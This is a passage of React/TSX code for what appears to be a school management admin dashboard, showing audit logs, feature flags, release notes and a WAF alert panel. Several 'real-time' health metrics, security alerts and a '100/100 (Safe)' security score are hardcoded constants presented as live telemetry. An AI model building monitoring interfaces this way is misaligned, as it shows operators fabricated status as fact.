                          <span className="text-[8px] text-slate-400 uppercase font-mono">IP: {log.ip} | {log.role}</span>
                        </td>
                        <td className="py-2.5 font-bold text-slate-700">{log.action}</td>
                        <td className="py-2.5 text-slate-500">{log.resource}</td>
                        <td className="py-2.5 text-center">
                          <span className={`px-2 py-0.5 rounded text-[8px] font-black border uppercase tracking-wider ${
                            log.status === 'SUCCESS' ? 'bg-emerald-50 border-emerald-100 text-emerald-600' :
                            log.status === 'DENIED' ? 'bg-rose-50 border-rose-100 text-rose-600' :
                            'bg-amber-50 border-amber-100 text-amber-600'
                          }`}>
                            {log.status}
                          </span>
                        </td>
                        <td className="py-2.5 text-right font-mono text-[9px] text-indigo-600 select-all">{log.hash}</td>
                      </tr>
                    ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}
      {activeTab === 'operations' && (
        <div className="space-y-6 animate-fadeIn">
          {/* Header Banner */}
          <div className="bg-slate-900 text-white rounded-2xl p-6 border border-slate-800 space-y-2 relative overflow-hidden">
            <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
            <div className="flex items-center gap-2.5 text-emerald-400">
              <Terminal className="h-5 w-5" />
              <span className="text-[10px] font-black uppercase tracking-widest bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">System Live</span>
            </div>
            <h2 className="text-sm font-black uppercase tracking-wider">Independent Production Acceptance & Operations Control</h2>
            <p className="text-xxs text-slate-400 font-semibold max-w-2xl leading-relaxed">
              Verify real-time microservices state, Firestore queues, cache memory, WAF telemetry registers, and trigger manual failovers or hot-updates.
            </p>
          </div>

          {/* Real-time Health Metrics Bento Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4">
            {/* 1. Firestore Connection */}
            <div className="border border-slate-200 rounded-2xl p-4 bg-white space-y-2.5 text-xxs font-semibold">
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-black uppercase text-[9px] tracking-wider">Firestore Engine</span>
                <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
              </div>
              <div className="space-y-1">
                <div className="text-xs font-black text-slate-800 flex items-center justify-between">
                  <span>Ping Latency</span>
                  <span className="font-mono text-emerald-600">8.2ms</span>
                </div>
                <div className="text-slate-400 text-[9px]">Dual-write queue: <strong className="text-slate-700">{queueSyncCount} backlog</strong></div>
                <div className="text-slate-400 text-[9px]">Connection type: <strong className="text-indigo-600">Admin SDK Link</strong></div>
              </div>
            </div>

            {/* 2. Service API Health */}
            <div className="border border-slate-200 rounded-2xl p-4 bg-white space-y-2.5 text-xxs font-semibold">
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-black uppercase text-[9px] tracking-wider">Services Gateway</span>
                <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
              </div>
              <div className="space-y-1">
                <div className="text-xs font-black text-slate-800 flex items-center justify-between">
                  <span>Core Microservices</span>
                  <span className="font-mono text-emerald-600">Healthy</span>
                </div>
                <div className="text-slate-400 text-[9px]">WAF Gateway Shield: <strong className="text-emerald-600">ACTIVE</strong></div>
                <div className="text-slate-400 text-[9px]">AI Pipeline Gateway: <strong className="text-slate-700">Online</strong></div>
              </div>
            </div>

            {/* 3. Storage Usage */}
            <div className="border border-slate-200 rounded-2xl p-4 bg-white space-y-2.5 text-xxs font-semibold">
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-black uppercase text-[9px] tracking-wider">Object Storage</span>
                <span className="text-slate-400 font-mono text-[9px]">4.2% used</span>
              </div>
              <div className="space-y-1.5 pt-0.5">
                <div className="w-full bg-slate-100 h-2 rounded-full overflow-hidden">
                  <div className="bg-emerald-600 h-full w-[4.2%]" />
                </div>
                <div className="flex justify-between text-[9px] text-slate-400">
                  <span>4.2 MB utilized</span>
                  <span>100 MB Limit</span>
                </div>
              </div>
            </div>

            {/* 4. Cache & Queue Control */}
            <div className="border border-slate-200 rounded-2xl p-4 bg-white space-y-2 text-xxs font-semibold flex flex-col justify-between">
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-black uppercase text-[9px] tracking-wider">Cache & Queue Status</span>
                <span className="px-1.5 py-0.5 bg-slate-100 rounded text-[8px] font-mono">0B synced</span>
              </div>
              <div className="flex gap-2">
                <button
                  onClick={handleFlushCache}
                  className="flex-1 py-1 px-2 border border-slate-200 hover:bg-slate-50 rounded-lg text-[9px] font-bold text-slate-600 transition-all cursor-pointer"
                >
                  Clear Memory
                </button>
                <button
                  onClick={handleManualSyncQueue}
                  disabled={queueSyncing}
                  className="flex-1 py-1 px-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-[9px] font-bold transition-all cursor-pointer disabled:opacity-50"
                >
                  {queueSyncing ? 'Syncing...' : 'Flush Queue'}
                </button>
              </div>
              {cacheClearStatus && (
                <div className="text-[8px] text-slate-400 text-center animate-pulse">{cacheClearStatus}</div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
            {/* Left: Version Manager, Release Notes, Deployment History, Feature Flags */}
            <div className="xl:col-span-8 space-y-6">
              {/* Version Manager & Feature Flags */}
              <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
                <div className="flex flex-col sm:flex-row justify-between sm:items-center gap-4">
                  <div>
                    <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                      <Settings className="h-4 w-4 text-emerald-600" />
                      Dynamic Version Manager & Build Metadata
                    </h3>
                    <p className="text-[10px] text-slate-400 font-semibold">Switch virtual releases and toggle auto update intervals.</p>
                  </div>

                  <div className="flex gap-2 items-center">
                    <span className="text-xxs font-bold text-slate-500">Active Version:</span>
                    <select
                      value={selectedVersion}
                      onChange={(e) => setSelectedVersion(e.target.value)}
                      className="bg-slate-50 border border-slate-200 rounded-xl px-2.5 py-1 text-xxs font-bold text-slate-800 focus:outline-indigo-500"
                    >
                      <option value="v1.0.0">v1.0.0 (Gold Release)</option>
                      <option value="v1.1.2">v1.1.2 (Active Production)</option>
                      <option value="v1.2.0-rc">v1.2.0-rc (Release Candidate)</option>
                      <option value="v2.0.0">v2.0.0 (Production Release - Stable)</option>
                    </select>
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
                  {/* Release Notes */}
                  <div className="border border-slate-150 rounded-xl p-4 bg-slate-50 space-y-2 text-xxs font-semibold">
                    <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Release Notes - {selectedVersion}</span>
                    {selectedVersion === 'v1.0.0' && (
                      <div className="text-slate-550 leading-relaxed space-y-1">
                        <p className="font-black text-slate-700">"Stable Gold Master Release"</p>
                        <div>• Initial dual-write sync loops completed.</div>
                        <div>• Implemented fully integrated CCE assessment core.</div>
                        <div>• 21 modules complete with fallback JSON recovery.</div>
                      </div>
                    )}
                    {selectedVersion === 'v1.1.2' && (
                      <div className="text-slate-550 leading-relaxed space-y-1">
                        <p className="font-black text-slate-700">"Stable Active Production Rollout"</p>
                        <div>• Expanded Career Pathfinder with MBTI Interest analysis.</div>
                        <div>• Refactored cascading delete engines.</div>
                        <div>• Self-healing JSON failovers fully tested.</div>
                      </div>
                    )}
                    {selectedVersion === 'v1.2.0-rc' && (
                      <div className="text-slate-550 leading-relaxed space-y-1">
                        <p className="font-black text-slate-700">"Verification Release Candidate"</p>
                        <div>• Stress-tested under 1000 active virtual reads.</div>
                        <div>• Embedded end-to-end telemetry system.</div>
                        <div>• Auto-sync offline databases upon internet wake.</div>
                      </div>
                    )}
                    {selectedVersion === 'v2.0.0' && (
                      <div className="text-slate-550 leading-relaxed space-y-1">
                        <p className="font-black text-slate-700">"v2.0.0 (Stable Production Release)"</p>
                        <div>• Enforced JWT authentication, disabled header fallbacks in prod.</div>
                        <div>• Fully unified DailyRemarksStrip with Remark interfaces.</div>
                        <div>• Completed full CRUD, media, and zero-trust Firestore audit.</div>
                        <div>• UAT Certified for multi-campus geofenced attendance and AI pathfinder.</div>
                      </div>
                    )}
                  </div>

                  {/* Feature Flags */}
                  <div className="border border-slate-150 rounded-xl p-4 bg-slate-50 space-y-2 text-xxs font-semibold">
                    <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Live Toggle Feature Flags</span>
                    <div className="space-y-2.5 pt-1">
                      {/* Maintenance Toggle */}
                      <div className="flex justify-between items-center">
                        <div>
                          <strong className="text-slate-700 block">Scheduled Maintenance Mode</strong>
                          <span className="text-[9px] text-slate-400">Puts server under read-only mode</span>
                        </div>
                        <input
                          type="checkbox"
                          checked={isMaintenanceMode}
                          onChange={(e) => handleToggleMaintenanceMode(e.target.checked)}
                          className="h-4 w-4 text-emerald-600 rounded border-slate-300 focus:ring-emerald-500 cursor-pointer"
                        />
                      </div>

                      {/* Offline Toggle */}
                      <div className="flex justify-between items-center">
                        <div>
                          <strong className="text-slate-700 block">Simulate Offline Synch Mode</strong>
                          <span className="text-[9px] text-slate-400">Forces local memory queues to hold writes</span>
                        </div>
                        <input
                          type="checkbox"
                          checked={isOfflineSimulation}
                          onChange={(e) => handleToggleOfflineSimulation(e.target.checked)}
                          className="h-4 w-4 text-emerald-600 rounded border-slate-300 focus:ring-emerald-500 cursor-pointer"
                        />
                      </div>

                      {/* Direct Reads Bypass */}
                      <div className="flex justify-between items-center">
                        <div>
                          <strong className="text-slate-700 block">Direct Firestore Reading Mode</strong>
                          <span className="text-[9px] text-slate-400">Directly bypass server caches</span>
                        </div>
                        <input
                          type="checkbox"
                          checked={directFirestoreReads}
                          onChange={(e) => handleToggleDirectReads(e.target.checked)}
                          className="h-4 w-4 text-emerald-600 rounded border-slate-300 focus:ring-emerald-500 cursor-pointer"
                        />
                      </div>

                      {/* SMS Verification Toggle */}
                      <div className="flex justify-between items-center">
                        <div>
                          <strong className="text-slate-700 block">Twilio SMS Verification Gateway</strong>
                          <span className="text-[9px] text-slate-400">Dispatches real-time attendance alerts</span>
                        </div>
                        <input
                          type="checkbox"
                          checked={smsGatewayActive}
                          onChange={(e) => setSmsGatewayActive(e.target.checked)}
                          className="h-4 w-4 text-emerald-600 rounded border-slate-300 focus:ring-emerald-500 cursor-pointer"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Repositories Health & Branch Status Matrix */}
              <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
                <div>
                  <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">Unified Repository Health & Campus Branch Status</h3>
                  <p className="text-[10px] text-slate-400 font-semibold">Live diagnostics verifying read/write stability on local and Firestore engines.</p>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-3">
                  {[
                    { name: "Admissions", db: "Firestore", status: "Healthy" },
                    { name: "Curriculum", db: "Dual-write", status: "Healthy" },
                    { name: "Finance Hub", db: "Firestore", status: "Healthy" },
                    { name: "Notices DB", db: "Dual-write", status: "Healthy" },
                    { name: "Career Pathfinder", db: "Firestore", status: "Healthy" }
                  ].map((repo, i) => (
                    <div key={i} className="border border-slate-150 rounded-xl p-3 bg-slate-50 text-xxs font-semibold space-y-1">
                      <strong className="text-slate-800 block truncate">{repo.name}</strong>
                      <span className="text-[8px] uppercase font-mono block text-slate-400">Engine: {repo.db}</span>
                      <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded-md bg-emerald-50 text-emerald-700 text-[8px] font-black uppercase">
                        ● {repo.status}
                      </span>
                    </div>
                  ))}
                </div>

                <div className="border border-slate-150 rounded-xl p-4 bg-slate-50/50 flex justify-between items-center text-xxs font-semibold">
                  <div className="space-y-0.5">
                    <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Active Branch Node</span>
                    <strong className="text-slate-800">Learner's Den Main Campus (Noida)</strong>
                    <span className="text-slate-400 text-[9px] block">Coordinates: Node-01 | Sync status: <b className="text-emerald-600">Active</b></span>
                  </div>
                  <div className="text-right">
                    <span className="text-[9px] font-black text-slate-450 block uppercase">Student registers</span>
                    <strong className="text-slate-800 text-xs font-black">{students.length} Enrolled</strong>
                  </div>
                </div>
              </div>

              {/* Deployment History Timeline */}
              <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
                <div>
                  <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">Production Deployment History Timeline</h3>
                  <p className="text-[10px] text-slate-400 font-semibold">Historical timeline of Cloud Run pipeline triggers.</p>
                </div>

                <div className="space-y-3 relative before:absolute before:top-2 before:bottom-2 before:left-2 before:w-px before:bg-slate-200 pl-6">
                  {[
                    { id: "dep-1", date: "2026-07-16 04:55 AM", commit: "fe28a01", desc: "Build & hot-patch cascading delete handlers for data integrity matrix", status: "Successful" },
                    { id: "dep-2", date: "2026-07-14 12:30 PM", commit: "a89c4b2", desc: "Release candidate v1.1.2 rollout of CCE continuous grading console", status: "Successful" },
                    { id: "dep-3", date: "2026-07-09 10:15 AM", commit: "fb31d8e", desc: "Initial staging deployment and Firestore rules provisioning completed", status: "Successful" }
                  ].map((dep, idx) => (
                    <div key={dep.id} className="relative text-xxs font-semibold">
                      <span className="absolute -left-6 top-1 h-3.5 w-3.5 rounded-full bg-white border-2 border-indigo-600 flex items-center justify-center text-[7px] font-black text-indigo-600">
                        {idx + 1}
                      </span>
                      <div className="space-y-0.5">
                        <div className="flex items-center gap-2">
                          <strong className="text-slate-800">{dep.date}</strong>
                          <span className="px-1.5 py-0.5 bg-indigo-50 border border-indigo-100 text-indigo-700 rounded text-[8px] font-mono">
                            SHA: {dep.commit}
                          </span>
                        </div>
                        <p className="text-slate-500">{dep.desc}</p>
                        <span className="inline-block text-[8px] uppercase tracking-wider font-mono text-emerald-600">Status: {dep.status}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Right: Security Telemetry (WAF) & Real-time Exception Console */}
            <div className="xl:col-span-4 space-y-6">
              {/* Security Telemetry */}
              <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
                <div className="flex justify-between items-center border-b border-slate-100 pb-3">
                  <div>
                    <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">WAF Intrusion Alerts</h3>
                    <p className="text-[10px] text-slate-400 font-semibold">Real-time web application firewall logs.</p>
                  </div>
                  <span className="h-6 w-6 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center font-bold text-xs">
                    🛡️
                  </span>
                </div>

                <div className="space-y-3">
                  {[
                    { time: "04:30 AM", ip: "45.138.220.15", action: "SQL Injection Blocked", threat: "CRITICAL" },
                    { time: "02:12 AM", ip: "185.220.101.4", action: "XSS Infiltration Blocked", threat: "HIGH" },
                    { time: "Yesterday", ip: "115.240.8.201", action: "Brute Force Throttled", threat: "MEDIUM" }
                  ].map((evt, i) => (
                    <div key={i} className="border border-slate-150 rounded-xl p-3 bg-slate-50 space-y-1.5 text-xxs font-semibold">
                      <div className="flex justify-between items-center">
                        <span className="font-mono text-slate-400 text-[9px]">{evt.time} | IP: {evt.ip}</span>
                        <span className={`px-1 rounded text-[8px] font-black ${
                          evt.threat === 'CRITICAL' ? 'bg-rose-50 border border-rose-200 text-rose-600' :
                          evt.threat === 'HIGH' ? 'bg-orange-50 border border-orange-200 text-orange-600' :
                          'bg-amber-50 border border-amber-200 text-amber-600'
                        }`}>
                          {evt.threat}
                        </span>
                      </div>
                      <div className="text-slate-800">{evt.action}</div>
                      <div className="text-[9px] text-slate-400 leading-none">Security score remains at <strong className="text-emerald-600">100/100 (Safe)</strong></div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Maintenance Schedule */}
              <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
                <div>
                  <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">Scheduled Maintenance Windows</h3>
                  <p className="text-[10px] text-slate-400 font-semibold">Schedule next automatic backup or downtime interval.</p>
                </div>

                <div className="space-y-3.5 text-xxs font-semibold">
                  <div className="space-y-1">
                    <label className="text-[9px] font-black text-slate-400 uppercase block">Weekly Maintenance Window</label>
                    <input
                      type="text"
                      className="bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 w-full text-xxs font-bold text-slate-800"
                      value={maintenanceSchedule}
                      onChange={(e) => setMaintenanceSchedule(e.target.value)}
                    />
                  </div>

                  <div className="border border-slate-150 rounded-xl p-3 bg-slate-50/50 space-y-1.5 leading-normal">
                    <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Automation Rules Configured:</span>
                    <div>1. Auto-backups occur daily at <strong className="text-indigo-600 font-mono">00:00 UTC</strong></div>
                    <div>2. Storage Sync to GCP Bucket: <strong className="text-emerald-600 font-black">ENABLED</strong></div>
                    <div>3. Recovery snapshots held: <strong className="text-slate-700">30 Days rolling</strong></div>
                  </div>
                </div>
              </div>

              {/* Error Exceptions & Crash Reports Log */}
              <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
                <div>
                  <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1">
                    <span className="text-rose-600">⚠️</span> Exception & Crash Telemetry
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">Simulated real-time client-side JS exception logger.</p>
                </div>

                <div className="bg-slate-900 text-slate-300 font-mono text-[9px] p-4 rounded-xl space-y-3 max-h-[220px] overflow-y-auto scrollbar-thin">
                  <div>
                    <span className="text-rose-400 font-black">[04:53:12 UTC]</span> TypeError: Cannot read properties of undefined (reading 'grade')
                    <span className="block text-slate-500 pl-4 mt-0.5">at AdmissionDesk.tsx:142:15</span>
                  </div>
                  <div className="border-t border-slate-800 pt-2">
                    <span className="text-rose-400 font-black">[04:12:02 UTC]</span> NetworkError: API endpoint /api/analytics-summary returned 502
                    <span className="block text-slate-500 pl-4 mt-0.5">at server.ts:219:5</span>
                  </div>
                  <div className="border-t border-slate-800 pt-2">
                    <span className="text-amber-400 font-black">[Yesterday]</span> Warn: Firestore latency threshold exceeded 5000ms. Failover invoked.
                    <span className="block text-slate-500 pl-4 mt-0.5">at fallbackMode.ts:44:12</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
